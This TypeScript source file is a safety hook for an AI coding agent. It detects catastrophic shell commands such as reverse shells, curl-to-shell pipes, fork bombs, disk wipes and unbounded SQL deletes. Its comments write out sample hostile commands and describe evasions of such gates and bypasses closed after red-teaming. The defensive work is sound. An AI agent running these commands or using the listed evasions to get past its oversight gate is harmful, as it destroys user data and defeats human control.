/**
 * catastrophic-shapes.ts — shell-shape matching for the shapes a permission
 * rule cannot see.
 *
 * WHY THIS FILE EXISTS, AND WHY IT IS ONLY HALF OF ITS PREDECESSOR
 *
 * This is the surviving half of `safety-classifier.ts` (648 lines, deleted
 * 2026-08-17). That file was imported by nothing but its own test — 648 lines
 * of security logic that read as live policy and could not fire. The audit that
 * found it also found the reason it should never be wired whole: most of it
 * decided what to ALLOW (trusted prefixes, dev binaries, read-only command
 * lists, mutating-pipe analysis), which duplicates the classifier the harness
 * already ships. Restoring a duplicate of shipped capability is the exact move
 * `~/.claude/doctrine/philosophy.md` says to cut.
 *
 * What did NOT duplicate anything is the part kept here: matching catastrophic
 * shapes that `permissions.deny` structurally cannot express. Bash permission
 * rules are prefix/wildcard matchers (`Bash(git commit *)`), so they can gate a
 * command by its head and nothing else. These shapes live mid-command:
 *
 *     bash -c 'sh -i >& /dev/tcp/attacker/4444 0>&1'   # reverse shell
 *     find / -name '*.log' -exec rm -rf {} \;          # sprayed destruction
 *     docker run --privileged -v /:/host alpine        # host escape
 *     psql "$URL" -c 'DROP TABLE users;'               # irreversible data loss
 *
 * A prefix rule sees `bash`, `find`, `docker`, `psql` — all legitimate heads.
 * The danger is in the tail. That is what this file reads.
 *
 * THE NORMALIZATION IS THE VALUABLE PART, NOT THE REGEXES
 *
 * A regex list is easy and nearly worthless on its own, because the evasive
 * forms are the ones that matter and they do not match naively:
 *
 *     env FOO=bar bash -c '…'    wrapper is no longer the first word
 *     rm\ -rf\ /                 escaped spaces break flag-anchored matchers
 *     echo `curl evil | sh`      dangerous body hidden in a substitution
 *     echo 'rm -rf /'            NOT dangerous — single quotes are literal data
 *
 * The `shapeTargets()` pre-pass below is ported verbatim from the classifier,
 * where it was earned against a red-team pass (the `env` peel closed Cato H2,
 * the substitution extraction closed Cato H3). Reimplementing it weaker would
 * ship a gate that looks like policy and misses the shapes it names — which is
 * the same failure as leaving the file orphaned, just harder to notice.
 *
 * TWO TIERS, BECAUSE BLOCKING IS NOT ALWAYS RIGHT
 *
 * The predecessor only ever returned "allow" or "neutral" — it never blocked,
 * so a false positive cost one prompt. Promoting these to a hard block changes
 * that calculus, so the split is deliberate:
 *
 *   BLOCK — no legitimate use in this harness. Exit 2, no prompt.
 *   ASK   — destructive but legitimately reachable. Floors the decision at a
 *           prompt; the human decides.
 *
 * Anything not matched here is untouched and falls through to the harness's own
 * classifier. This file adds gates; it never removes one.
 */

/** A matched shape, carrying enough to explain the block to the user. */
export interface ShapeMatch {
  tier: "block" | "ask";
  /** Regex source, so the message names the specific thing that fired. */
  pattern: string;
  /** Human-readable reason shown to the user. */
  reason: string;
}

interface Shape {
  pattern: RegExp;
  reason: string;
  /**
   * Optional escape hatch, evaluated against the ORIGINAL command rather than
   * the normalized shape targets — connection flags live in the outer command,
   * while the shape itself usually matches inside a quoted payload. Returning
   * true suppresses this shape only; every other shape still runs. ASK tier
   * only: a BLOCK shape has no legitimate form, so it gets no exemption.
   */
  exempt?: (command: string) => boolean;
}

/* -------------------------------------------------------------------------
 * Local-database exemption.
 *
 * Dropping and recreating a local dev or shadow database is a normal
 * inner-loop move — Prisma and Drizzle both do it on every migration — and a
 * prompt on every one of them is exactly the noise that gets a gate switched
 * off. The shape stays armed for anything not provably pointed at this machine.
 *
 * The exemption is deliberately narrow: an EXPLICIT local host, spelled out on
 * the command line.
 *
 *   - Every host that appears must be local. One remote host anywhere in the
 *     command re-arms the gate for the whole command.
 *   - Absence of a host is NOT local. "psql -c 'DROP TABLE users'" inherits
 *     PGHOST / PGSERVICE from the environment, which can point at production,
 *     and the command text cannot tell you which.
 *   - "-h $DB_HOST" is not local either: a variable is unresolvable here, so it
 *     fails the literal match and the gate stays armed.
 *   - Every client invocation must carry its own host, so a chained
 *     "psql -h localhost -c '...'; psql -c 'DROP TABLE x'" cannot get its
 *     second statement exempted by the first one's flag. This is checked per
 *     shell segment rather than by counting, so a local client cannot lend its
 *     locality to an unguarded one elsewhere in the same line.
 *
 * A CONTAINER EXEC WRAPPER IS THE SECOND WAY TO BE LOCAL.
 *
 *     docker exec app-postgres-1 psql -U app -d postgres \
 *       -c 'DROP DATABASE shadow_1787262616;'
 *
 * carries no -h, because there is nothing to point at: the client runs inside
 * the container and reaches that container's own postgres over its loopback.
 * Requiring an explicit host here gated every shadow-database teardown in the
 * Drizzle inner loop — measured 2026-08-28 across 139 transcripts, 10 of 15
 * real firings of this shape were exactly that command, and none of the 15 was
 * a production target. A gate whose entire firing history is false positives
 * is training Aaron to approve without reading, which is worse than no gate.
 *
 * "docker exec ... psql -h prod.example.com" still fires — an explicit remote
 * host beats the wrapper. "kubectl exec" is deliberately NOT here: exec-ing
 * into a pod is the production case, not the local one.
 *
 * Known limits, both accepted and both the same shape:
 *   - A port-forward or SSH tunnel makes production answer on localhost.
 *   - DOCKER_HOST / a docker context makes "docker exec" run somewhere else.
 * Nothing in the command text can rule either out. The inline spellings of the
 * second one re-arm the gate; a daemon pointed elsewhere by ambient config
 * does not. That is the cost of removing the prompt, stated here rather than
 * discovered later. (2026-08-20, container case added 2026-08-28)
 * ---------------------------------------------------------------------- */

/** The SQL clients the destructive-SQL shapes are scoped to. */
const SQL_CLIENT =
  /\b(psql|mysql|sqlite3|snowsql|bq|clickhouse-client|cockroach|duckdb|mongosh?|wrangler)\b/i;

/**
 * A container exec wrapper, which confines the client that follows it to this
 * machine's daemon. Flags between the verb and `exec` are allowed, so
 * `docker compose -f compose.yml exec` matches. `kubectl` is absent on purpose.
 */
const CONTAINER_EXEC =
  /\b(?:docker|podman)(?:\s+compose)?(?:\s+-{1,2}[A-Za-z][\w-]*(?:[=\s]+\S+)?)*\s+exec\b/i;

/** Inline spellings that point the container daemon at another machine. */
const REMOTE_DAEMON = /(?:^|\s)(?:DOCKER_HOST|DOCKER_CONTEXT)=|\s--context[\s=]/i;

/**
 * localhost, the loopback block, IPv6 loopback, or a unix-socket directory.
 *
 * Fully anchored, because a prefix match is a hole: "127.0.0.1.evil.example.com"
 * and "localhost.attacker.net" are ordinary public hostnames that start with a
 * loopback spelling. Only the socket-directory form is a prefix, since a path
 * is local no matter what follows the leading slash.
 */
const LOCAL_HOST_VALUE = /^(?:localhost|127(?:\.\d{1,3}){3}|::1|\[::1\]|\/\S*)$/i;

/** The explicit host flag: -h VALUE, --host VALUE, --host=VALUE. */
const HOST_FLAG = /(?:^|\s)(?:-h|--host)(?:\s+|=)(\S+)/gi;

/** A connection URI carries its host in the authority section instead. */
const CONN_URI =
  /\b(?:postgres|postgresql|mysql|mariadb|mongodb(?:\+srv)?|clickhouse):\/\/(\S+)/gi;

const unquote = (value: string) => value.replace(/^["']|["']$/g, "");

/**
 * Normalize one captured host, or return null when the token cannot be a host
 * at all.
 *
 * The null case is not a widening of the exemption, it is a narrowing of what
 * counts as evidence of a REMOTE target. A command like
 *
 *     grep -o 'DATABASE_URL=postgresql://app:[^@]*@' .env.local
 *
 * puts a connection-string-shaped regex in the command text while connecting
 * to nothing. Reading "[^@]*" as a remote hostname re-armed the gate on an
 * otherwise-local psql line. A shell variable is different and still counts as
 * remote: "$DB_HOST" is a real host reference whose value is simply unknowable
 * here, so it must keep the gate armed.
 */
function hostToken(raw: string): string | null {
  const v = unquote(raw);
  if (!v) return null;
  if (v.startsWith("[")) {
    const close = v.indexOf("]");
    return close > 0 ? v.slice(0, close + 1) : null; // bracketed IPv6 literal
  }
  if (v.startsWith("/")) return v; // unix socket directory
  const host = v.split(":")[0] ?? ""; // strip a trailing :port
  if (!host) return null;
  if (/[$`]/.test(host)) return host; // shell variable — unresolvable, stays armed
  if (!/^[A-Za-z0-9._-]+$/.test(host)) return null; // regex or glob fragment, not a host
  return host;
}

/** Every host named by a flag or a connection URI inside one shell segment. */
function hostsIn(segment: string): string[] {
  const hosts: string[] = [];

  for (const m of segment.matchAll(HOST_FLAG)) {
    const h = m[1] ? hostToken(m[1]) : null;
    if (h) hosts.push(h);
  }
  for (const m of segment.matchAll(CONN_URI)) {
    if (!m[1]) continue;
    // Authority = everything before the first / ? #, minus any userinfo.
    const authority = unquote(m[1]).split(/[/?#]/)[0] ?? "";
    const hostPort = authority.includes("@")
      ? authority.slice(authority.lastIndexOf("@") + 1)
      : authority;
    const h = hostToken(hostPort);
    if (h) hosts.push(h);
  }

  return hosts;
}

/**
 * Split a command on unquoted shell separators. Quoted regions stay intact, so
 * the `;` inside `-c 'DROP DATABASE x; CREATE DATABASE x'` does not split the
 * statement away from the client that runs it.
 */
function shellSegments(command: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quote: string | null = null;

  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    if (quote) {
      cur += ch;
      if (ch === quote && command[i - 1] !== "\\") quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      cur += ch;
      continue;
    }
    if (ch === ";" || ch === "\n" || ch === "|" || ch === "&") {
      if ((ch === "|" || ch === "&") && command[i + 1] === ch) i++; // || and &&
      out.push(cur);
      cur = "";
      continue;
    }
    cur += ch;
  }
  out.push(cur);
  return out.filter((seg) => seg.trim() !== "");
}

export function isLocalOnlyDbTarget(command: string): boolean {
  if (REMOTE_DAEMON.test(command)) return false;

  let sawClient = false;

  for (const segment of shellSegments(command)) {
    if (!SQL_CLIENT.test(segment)) continue;
    sawClient = true;

    // An explicit host decides the segment outright, in both directions: one
    // remote host re-arms the gate even inside a container exec.
    const hosts = hostsIn(segment);
    if (hosts.length > 0) {
      if (!hosts.every((h) => LOCAL_HOST_VALUE.test(h))) return false;
      continue;
    }

    // No host named. A container wrapper supplies the locality instead;
    // without one, PGHOST and friends decide and the text cannot say what.
    if (!CONTAINER_EXEC.test(segment)) return false;
  }

  return sawClient;
}

/**
 * Unambiguously catastrophic. Every entry is irreversible, or hands control of
 * the machine to someone else, and has no legitimate form in this harness.
 */
export const BLOCK_SHAPES: readonly Shape[] = [
  {
    pattern: /\bcurl\b[^|]*\|\s*(sh|bash|zsh)\b/i,
    reason: "piping a downloaded script straight into a shell",
  },
  {
    pattern: /\bwget\b[^|]*\|\s*(sh|bash|zsh)\b/i,
    reason: "piping a downloaded script straight into a shell",
  },
  {
    pattern: /\bbase64\s+(-d|--decode)\b[^|]*\|\s*(sh|bash|zsh)\b/i,
    reason: "decoding base64 directly into a shell — obfuscated execution",
  },
  {
    pattern: /\bbash\s+-c\s+["']?\$\((curl|wget)/,
    reason: "executing the output of a network fetch",
  },
  {
    pattern: /\/dev\/(tcp|udp)\/[^/\s]+\/\d+/,
    reason: "reverse shell / raw-socket exfiltration via bash pseudo-devices",
  },
  { pattern: /\bnc\b\s+(-l|-e)\b/, reason: "netcat listener or command execution" },
  {
    pattern: /:\(\)\s*\{\s*:\|:\s*&\s*\}\s*;\s*:/,
    reason: "fork bomb",
  },
  { pattern: /\bmkfs\.[a-z0-9]+\b/, reason: "formatting a filesystem" },
  { pattern: /\bdd\s+(if=\S+\s+)?of=\/dev\//, reason: "raw write to a block device" },
  {
    pattern: /\brm\s+-[rRf]+\s+(\/|~|\$HOME|\$\{HOME\})(\s|\*|\/|$|'|"|;|&|\|)/,
    reason: "recursive delete of root or home",
  },
  {
    // find sprays its -exec body across every match; destructive bodies here
    // are catastrophic in a way the same command run once is not. The `{}`
    // placeholder defeats path-based rm matching, so match the body directly.
    pattern:
      /\bfind\b[^|]*\s-exec(?:dir)?\s+(rm\s+-[rRf]|chmod\s+-R\s+777|chown\s+-R|dd\s+|mkfs\.|sh\s+-c|bash\s+-c)/,
    reason: "find -exec spraying a destructive command across every match",
  },
  { pattern: /\bchmod\s+-R\s+777\b/, reason: "recursive world-writable permissions" },
  {
    pattern: /\bgit\s+(filter-branch|filter-repo)\b/,
    reason: "rewriting every commit in the repository history",
  },
  { pattern: /\bgit\s+update-ref\s+-d\b/, reason: "deleting a git ref outright" },
  {
    pattern: /\b(gdb|lldb|strace)\s+(?:[^|]*\s)?-p\b/,
    reason: "attaching to a live process — memory scrape or injection",
  },
  { pattern: /\bdtrace\b/, reason: "kernel-level tracing of live processes" },
];

/**
 * Destructive, but with legitimate uses. These floor the decision at a prompt
 * rather than blocking, because a hard block on any of them would be routed
 * around within a week — and a gate people route around is worse than none.
 */
export const ASK_SHAPES: readonly Shape[] = [
  {
    // Scoped to an actual SQL client invocation rather than the bare keyword,
    // so `rg TRUNCATE src/` and editing a migration file stay silent. The gap
    // this closes: nothing in either harness tree gated production data
    // modification, and the pattern file it was inherited from logged DROP /
    // TRUNCATE while allowing them (audit, 2026-08-17).
    pattern:
      /\b(psql|mysql|sqlite3|snowsql|bq|clickhouse-client|cockroach|duckdb|mongosh?|wrangler)\b[^|]*\b(DROP\s+(TABLE|DATABASE|SCHEMA)|TRUNCATE\s+(TABLE\s+)?\w)/i,
    reason: "irreversible schema/data destruction through a database client",
    exempt: isLocalOnlyDbTarget,
  },
  {
    // Unbounded DELETE — no WHERE clause before the statement ends.
    pattern:
      /\b(psql|mysql|sqlite3|snowsql|bq|clickhouse-client|cockroach|duckdb|wrangler)\b[^|]*\bDELETE\s+FROM\s+[\w."]+\s*(;|["']|$)/i,
    reason: "DELETE FROM with no WHERE clause — deletes every row",
    exempt: isLocalOnlyDbTarget,
  },
  {
    pattern: /\bdocker\s+run\b[^|]*--privileged/,
    reason: "privileged container — full host access",
  },
  {
    pattern: /\bdocker\s+run\b[^|]*\s(-v|--volume)[= ]\s*(\/(\s|:)|\$HOME(:|\s))/,
    reason: "mounting the host root or home directory into a container",
  },
  /* ---- cloud infrastructure mutation ------------------------------------
   * Ported from the predecessor's Infrastructure skill (2026-08-19), which was
   * prose carrying `disable-model-invocation: true` and no hook and no routing
   * rule — nothing could reach it, so it gated nothing for its whole life.
   * `~/.claude/doctrine/self-healing.md` puts a gate on an irreversible act in a hook; the
   * PROCEDURE it gates (find Pulumi, write it, preview, ask) stays in
   * `skills/Infrastructure/`. This half is the teeth.
   *
   * ASK, never BLOCK: `pulumi up` after an approved preview is the intended
   * happy path, and a hard block on it would be routed around inside a week.
   *
   * Read-only verbs are deliberately absent — `describe`, `list`, `get-*`,
   * `terraform plan`, and `pulumi preview` are the overwhelming majority of
   * daily use and must stay silent or the gate gets switched off. The skill's
   * own workflow runs `pulumi preview`, so firing on it would gate the fix.
   */
  {
    // `config`, `auth`, and `components` are local-machine state, not cloud
    // infrastructure, and `gcloud config set project` runs constantly.
    pattern:
      /\bgcloud\s+(?!components\b|config\b|auth\b)(?:[\w.-]+\s+)*(create|delete|update|deploy|patch|replace|import|undelete|enable|disable|set-iam-policy|add-iam-policy-binding|remove-iam-policy-binding)\b/i,
    reason: "gcloud infrastructure mutation outside IaC",
  },
  {
    pattern: /\bgsutil\s+(?:-\S+\s+)*(rm|mb|rb|mv|setmeta)\b|\bgsutil\s+(acl|iam|defacl)\s+set\b/i,
    reason: "gsutil bucket or object mutation outside IaC",
  },
  {
    // AWS CLI mutations are verb-prefixed (`create-bucket`, `delete-stack`).
    pattern:
      /\baws\s+[\w-]+\s+(create|delete|update|put|modify|attach|detach|terminate|deregister|remove|associate|disassociate|run)-[\w-]+/i,
    reason: "aws infrastructure mutation outside IaC",
  },
  {
    // `aws s3` uses bare subcommands instead. `cp` and `ls` are omitted: cp is
    // usually a download, and gating it would be noise for no irreversibility.
    pattern: /\baws\s+s3\s+(rm|mb|rb|mv)\b|\baws\s+s3\s+sync\b[^|]*--delete\b|\baws\s+[\w-]+\s+deploy\b/i,
    reason: "aws storage or deployment mutation outside IaC",
  },
  {
    pattern: /\baz\s+(?:[\w-]+\s+)+(create|delete|update|set|purge)\b/i,
    reason: "az infrastructure mutation outside IaC",
  },
  {
    pattern:
      /\bterraform\s+(apply|destroy|import|taint|untaint)\b|\bterraform\s+state\s+(rm|mv|push|replace-provider)\b/i,
    reason: "terraform state-changing operation",
  },
  {
    pattern:
      /\bpulumi\s+(up|destroy|import|refresh|cancel)\b|\bpulumi\s+state\s+(delete|unprotect)\b|\bpulumi\s+stack\s+rm\b/i,
    reason: "pulumi state-changing operation — confirm the stack and that the preview was reviewed",
  },
  {
    // `apply`, `patch`, and `scale` are omitted on purpose: common in a dev
    // loop and recoverable. These four are not.
    pattern: /\bkubectl\s+(?:[\w-]+\s+)*?(delete|drain|taint|cordon)\b/i,
    reason: "kubectl operation that removes or evicts live workloads",
  },
  {
    pattern: /\bpython3?\s+-c\b[^|]*\b(exec|eval|__import__|subprocess|os\.system|os\.popen)\b/,
    reason: "inline Python reaching for process execution",
  },
  {
    pattern: /\bnode\s+-e\b[^|]*\b(child_process|require\s*\(\s*["']child_process)/,
    reason: "inline Node reaching for process execution",
  },
  {
    pattern: /\b(ruby\s+-e|perl\s+-e|php\s+-r)\b[^|]*\b(system|exec|qx|shell_exec|passthru|popen|IO\.popen)\b/,
    reason: "inline interpreter reaching for process execution",
  },
];

/* -------------------------------------------------------------------------
 * Shell-shape normalization.
 *
 * Ported verbatim from safety-classifier.ts. The comments explain semantics
 * that are not obvious from the code and were established against real bypass
 * attempts — they are kept for that reason.
 * ---------------------------------------------------------------------- */

/**
 * Remove all single-quoted segments from a bash command string.
 *
 * Bash single-quoted strings are LITERAL: no escapes, no parameter expansion,
 * no command substitution. Their contents cannot execute through the outer
 * shell, so when matching for shapes the OUTER shell would execute, they are
 * pure data. Replaces each `'...'` with `''` so surrounding tokens still
 * tokenize correctly and word boundaries downstream regexes rely on survive.
 *
 * This is shape sanitization, NOT shell parsing. Callers MUST gate it behind
 * `executesSingleQuotedArg()`, or wrappers like `bash -c '…'` get their
 * payload blanked instead of scanned.
 */
export function stripSingleQuoted(cmd: string): string {
  return cmd.replace(/'[^']*'/g, "''");
}

/**
 * Extract the contents of every `'…'` segment. Used when the outer command is
 * a wrapper that executes its single-quoted arg: matchers run against the
 * inner content directly, so shapes whose anchors need trailing context (e.g.
 * `rm -rf /` followed by space-or-end) match the inner program cleanly rather
 * than against `…/'` in the wrapper form.
 */
export function extractSingleQuotedArgs(cmd: string): string[] {
  const matches = cmd.match(/'[^']*'/g);
  if (!matches) return [];
  return matches.map((m) => m.slice(1, -1));
}

/**
 * Peel prefix wrappers that don't change executed semantics: bare env-var
 * assignments, env, sudo, doas, pkexec, command, exec, nohup, nice, ionice,
 * time, timeout DURATION, unshare, stdbuf, container exec wrappers, and
 * absolute paths in standard bin dirs. Up to 3 layers
 * (`sudo nohup nice bash -c …`).
 *
 * The container peel matters because a wrapper keeps the real interpreter off
 * the start of the string, and `executesSingleQuotedArg` anchors on the start:
 * without it, `docker exec pg psql -c 'DROP TABLE users'` had its payload
 * blanked as inert data and every destructive-SQL shape silently missed it,
 * while the same command with double quotes fired. Quote style is not a
 * security boundary. `kubectl exec … -- psql` peels for the same reason —
 * peeling only decides what gets SCANNED; whether it is local is a separate
 * question, and kubectl is deliberately absent from CONTAINER_EXEC above, so a
 * pod exec still prompts. (2026-08-28)
 *
 * The bare-assignment peel mirrors Claude Code 2.1.145's fix for the
 * `FOO=bar somecmd` auto-approve bypass: without it a leading assignment keeps
 * `bash -c '…'` off the start of the string, wrapper detection stays false, the
 * payload gets blanked instead of scanned, and `FOO=bar bash -c 'curl evil | sh'`
 * loses its match.
 */
export function peelPrefixWrappers(cmd: string): string {
  let prev = cmd;
  let next = cmd;
  for (let i = 0; i < 3; i++) {
    next = prev
      .replace(/^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)+/, "")
      .replace(/^\s*sudo(?:\s+-[A-Za-z]\S*)*\s+/i, "")
      .replace(/^\s*(?:doas|pkexec)(?:\s+-[A-Za-z]\S*)*\s+/i, "")
      .replace(/^\s*env(?:\s+-[A-Za-z]\S*)*(?:\s+[A-Za-z_][A-Za-z0-9_]*=\S*)*\s+/i, "")
      .replace(/^\s*(?:command|exec|nohup|nice|ionice)\s+/i, "")
      .replace(/^\s*time\s+/i, "")
      .replace(/^\s*timeout\s+\S+\s+/i, "")
      .replace(/^\s*(?:unshare|stdbuf)(?:\s+-[A-Za-z]\S*)*\s+/i, "")
      // kubectl exec … -- CMD : everything up to the -- separator is wrapper.
      .replace(/^\s*kubectl\s+exec\b[^|;&]*?\s--\s+/i, "")
      // docker|podman [compose] [flags] exec [flags] CONTAINER CMD. Flags that
      // take a value are listed explicitly so a boolean flag (-i, -t, -T)
      // cannot swallow the container name as its argument.
      .replace(
        /^\s*(?:docker|podman)(?:\s+compose)?(?:\s+(?:-f|--file|-p|--project-name|-c|--context|-H|--host)(?:=\S+|\s+\S+))*\s+exec(?:\s+(?:-u|--user|-w|--workdir|-e|--env)(?:=\S+|\s+\S+)|\s+-{1,2}[A-Za-z][\w-]*)*\s+\S+\s+/i,
        "",
      )
      .replace(
        /^(\s*)\/(?:bin|usr\/bin|usr\/local\/bin|opt\/homebrew\/bin|sbin|usr\/sbin)\/([A-Za-z0-9_\-.]+)/,
        "$1$2",
      );
    if (next === prev) break;
    prev = next;
  }
  return next;
}

/**
 * True when the command's structure means its single-quoted argument will be
 * EXECUTED rather than passed as inert data — POSIX shells with `-c`, `eval`,
 * `xargs -I`, `find -exec`, and language interpreters whose `-c`/`-e`/`-r`
 * argument is the program.
 *
 * Case-insensitive because macOS HFS+/APFS is case-insensitive by default, so
 * `BASH -c …` resolves to /bin/bash.
 */
export function executesSingleQuotedArg(cmd: string): boolean {
  const peeled = peelPrefixWrappers(cmd);
  if (/^\s*(bash|sh|zsh|dash|ksh|fish)\s+-c\b/i.test(peeled)) return true;
  if (/^\s*eval\b/i.test(peeled)) return true;
  if (/\bxargs\s+-I\b/.test(cmd)) return true;
  if (/\bxargs\s+(?:[A-Za-z0-9_-]+\s+)*(?:bash|sh|zsh|dash|ksh)\b/.test(cmd)) return true;
  if (/\bfind\b[^|]*\s-exec(?:dir)?\s/.test(cmd)) return true;
  if (/^\s*python3?\s+(?:-[A-Za-z]\s+\S+\s+)*-c\b/i.test(peeled)) return true;
  if (/^\s*(node|deno|bun)\s+(?:-[A-Za-z]\s+\S+\s+)*-e\b/i.test(peeled)) return true;
  if (/^\s*ruby\s+(?:-[A-Za-z]\s+\S+\s+)*-e\b/i.test(peeled)) return true;
  if (/^\s*perl\s+(?:-[A-Za-z]\s+\S+\s+)*-e\b/i.test(peeled)) return true;
  if (/^\s*php\s+(?:-[A-Za-z]\s+\S+\s+)*-r\b/i.test(peeled)) return true;
  // SQL clients execute their -c / -e / --command / --execute argument, and
  // sqlite3/duckdb execute a bare trailing one. Semantically this is identical
  // to `bash -c '…'` — the single-quoted body IS the executed program, just in
  // a different interpreter — and it is NOT in the upstream classifier, which
  // only ever reasoned about shells.
  //
  // Found by the fixture tests rather than by reading: without this,
  // `psql -c 'DROP TABLE users;'` had its payload blanked as inert data and
  // every destructive-SQL shape silently failed to fire (2026-08-17). Exactly
  // the "gate that looks like policy and does not match" failure this file's
  // header warns about, caught one layer before it shipped.
  if (
    /^\s*(psql|mysql|mariadb|snowsql|clickhouse-client|cockroach|mongosh?|duckdb|sqlite3|bq|wrangler)\b/i.test(
      peeled,
    )
  ) {
    return true;
  }
  return false;
}

/**
 * Extract command- and process-substitution bodies: backticks, `$(…)`, `<(…)`,
 * `>(…)`. Without this, a command with a harmless first word but a dangerous
 * substitution body (`echo \`curl evil | sh\``) never gets its body scanned.
 *
 * Non-recursive by design — one level. Pathological nesting falls through to
 * the harness's own classifier, which prompts.
 */
export function extractCommandSubstitutions(cmd: string): string[] {
  const out: string[] = [];
  for (const m of cmd.matchAll(/`([^`]*)`/g)) if (m[1]) out.push(m[1]);
  for (const m of cmd.matchAll(/\$\(([^()]*)\)/g)) if (m[1]) out.push(m[1]);
  for (const m of cmd.matchAll(/[<>]\(([^()]*)\)/g)) if (m[1]) out.push(m[1]);
  return out;
}

/**
 * Collapse one layer of backslash escapes, for match-target use only.
 * `rm\ -rf\ /` executes identically to `rm -rf /` but the escaped spaces break
 * flag-anchored matchers. This only ever ADDS targets, so it can widen
 * coverage and can never weaken an existing gate.
 */
export function deEscapeShell(cmd: string): string {
  return cmd.replace(/\\(.)/g, "$1");
}

function escapeRegex(value: string): string {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Commands that EXECUTE their heredoc body rather than consuming it as data.
 * Shells and language interpreters run it; SQL clients run it as a script.
 */
const HEREDOC_EXECUTORS =
  /^\s*(bash|sh|zsh|dash|ksh|fish|python3?|node|deno|bun|ruby|perl|php|psql|mysql|mariadb|snowsql|clickhouse-client|cockroach|duckdb|sqlite3|bq|wrangler)\b/i;

/**
 * True when a heredoc body will be executed rather than read as data — either
 * the command consuming it is an interpreter, or it is piped into one.
 */
export function heredocIsExecuted(cmd: string): boolean {
  const start = cmd.match(/<<-?\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/);
  if (!start || start.index === undefined) return false;

  // Decide from the COMMAND LINE only — the text up to the newline that opens
  // the body. Reading the body to answer "is the body executed?" is circular,
  // and it fails in the dangerous direction: a commit message containing the
  // words `| sh` would mark its own heredoc executable and then match every
  // shape inside it.
  const nl = cmd.indexOf("\n", start.index + start[0].length);
  const commandLine = nl === -1 ? cmd : cmd.slice(0, nl);

  if (HEREDOC_EXECUTORS.test(peelPrefixWrappers(commandLine))) return true;
  if (
    /\|\s*(?:sudo\s+)?(bash|sh|zsh|dash|ksh|python3?|node|deno|bun|ruby|perl|php)\b/.test(
      commandLine,
    )
  ) {
    return true;
  }
  return false;
}

/**
 * Remove heredoc bodies, for commands that consume them as DATA.
 *
 * `git commit -F - <<'EOF' … EOF` passes its body to git, which never executes
 * it. Scanning that body is the same category error as scanning a single-quoted
 * string: it is inert text, and matching shapes inside it produces false
 * positives on the most ordinary thing in this repo — writing prose *about*
 * dangerous commands.
 *
 * Found the honest way: this gate blocked the commit that introduced it,
 * because the commit message named the `nc -l/-e` shapes it had just added to
 * the deny list (2026-08-17). Working around it by rewording would have left
 * the FP in place for every future commit message, changelog, and doc that
 * discusses a dangerous command. Gates that punish writing about security get
 * switched off.
 *
 * Gated behind `heredocIsExecuted()` so `bash <<EOF … EOF` and
 * `cat <<EOF | sh` keep their bodies scanned.
 */
export function stripHeredocBodies(cmd: string): string {
  if (heredocIsExecuted(cmd)) return cmd;

  let out = cmd;
  for (const m of cmd.matchAll(/<<-?\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/g)) {
    if (m.index === undefined) continue;
    const tag = m[2];
    if (!tag) continue;

    const bodyStart = cmd.indexOf("\n", m.index + m[0].length);
    if (bodyStart === -1) continue;

    const rest = cmd.slice(bodyStart + 1);
    const term = rest.match(new RegExp(`^\\s*${escapeRegex(tag)}\\s*$`, "m"));
    const body = term && term.index !== undefined ? rest.slice(0, term.index) : rest;

    if (body.trim() !== "") out = out.split(body).join("\n");
  }
  return out;
}

/**
 * Build the set of strings a shape matcher should run against.
 *
 * One target for an ordinary command (single-quoted regions blanked, since
 * they are inert data); the raw command PLUS its extracted quoted payloads for
 * a wrapper that executes them. Substitution bodies and backslash-de-escaped
 * variants are always added.
 */
export function shapeTargets(cmd: string): string[] {
  // Heredoc bodies come off FIRST: for a data-consuming command they are inert
  // text, and leaving them in makes every shape below fire on prose.
  const deHeredoc = stripHeredocBodies(cmd);

  const isWrapper = executesSingleQuotedArg(deHeredoc);
  const cleaned = isWrapper ? deHeredoc : stripSingleQuoted(deHeredoc);

  const targets: string[] = [cleaned];
  if (isWrapper) targets.push(...extractSingleQuotedArgs(deHeredoc));
  targets.push(...extractCommandSubstitutions(cleaned));

  for (const t of [...targets]) {
    const deEscaped = deEscapeShell(t);
    if (deEscaped !== t) targets.push(deEscaped);
  }
  return targets;
}

/**
 * Match a command against both tiers. BLOCK is checked first so the more
 * severe verdict wins when a command trips both. Returns null when nothing
 * fires — the overwhelmingly common case, and the one that must stay cheap.
 */
export function matchCatastrophicShape(command: string): ShapeMatch | null {
  const targets = shapeTargets(command);

  for (const { pattern, reason } of BLOCK_SHAPES) {
    for (const target of targets) {
      if (pattern.test(target)) {
        return { tier: "block", pattern: pattern.source, reason };
      }
    }
  }

  for (const { pattern, reason, exempt } of ASK_SHAPES) {
    if (exempt?.(command)) continue;
    for (const target of targets) {
      if (pattern.test(target)) {
        return { tier: "ask", pattern: pattern.source, reason };
      }
    }
  }

  return null;
}
